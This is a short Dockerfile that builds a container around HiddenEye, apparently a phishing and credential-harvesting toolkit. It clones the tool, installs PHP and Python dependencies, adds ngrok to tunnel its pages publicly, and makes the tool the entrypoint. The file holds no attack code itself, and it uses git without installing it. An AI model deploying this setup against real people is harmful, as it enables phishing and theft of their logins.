FROM ubuntu
MAINTAINER mcbplay1@gmail.com

RUN apt-get update -y
RUN apt-get upgrade -y
RUN apt-get install sudo python3 python3-pip wget apt-transport-https lsb-release ca-certificates wget apt-utils -y
RUN wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
RUN echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/php.list
RUN apt-get update -y
RUN apt-get upgrade -y
RUN apt-get install php7.2 -y
WORKDIR /root
RUN git clone https://github.com/DarkSecDevelopers/HiddenEye.git
WORKDIR /root/HiddenEye
RUN pip3 install -r requirements.txt
RUN chmod +x HiddenEye.py
RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip
RUN unzip ngrok.zip
RUN rm -r ngrok.zip
RUN mv ngrok Server/ngrok
RUN ln -s /root/HiddenEye/HiddenEye.py /bin/HiddenEye
ENTRYPOINT ["python3", "/root/HiddenEye/HiddenEye.py"]
